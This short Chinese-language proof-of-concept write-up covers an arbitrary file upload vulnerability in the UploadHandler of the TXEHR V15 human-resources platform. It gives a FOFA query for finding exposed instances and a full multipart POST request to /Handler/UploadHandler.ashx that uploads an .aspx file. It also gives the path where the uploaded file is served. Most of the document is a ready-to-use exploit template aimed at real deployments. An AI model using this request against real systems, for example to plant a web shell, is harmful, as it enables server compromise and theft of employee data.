# 同享人力管理管理平台UploadHandler存在任意文件上传漏洞

同享软件成立于1997年，运营中心位于东莞南城南新产业国际。专注研发和推广人力资源信息化产品，帮助企业构建统一的人力资源数智化平台，快速提高企业人才管理能力，提升人力资源管理效率，帮助员工快速成长，协助企业实现智慧决策。同享TXEHR V15人力管理管理平台UploadHandler存在任意文件上传漏洞。

## fofa

```java
body="/Assistant/Default.aspx"
```

## poc

```java
POST /Handler/UploadHandler.ashx?folder=Uploadfile2 HTTP/1.1
Host: 
accept: */*
Content-Type: multipart/form-data; boundary=---------------------------123
Content-Length: 226
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------123
Content-Disposition: form-data; name="Filedata"; filename="12333.aspx"
Content-Type: text/plain

safdsfsfaa
-----------------------------123--
```

![image-20240802210147084](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408022101143.png)

文件路径：`http://127.0.0.1:9000/Handler/Uploadfile2/12333.aspx`

![image-20240802210206242](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408022102279.png)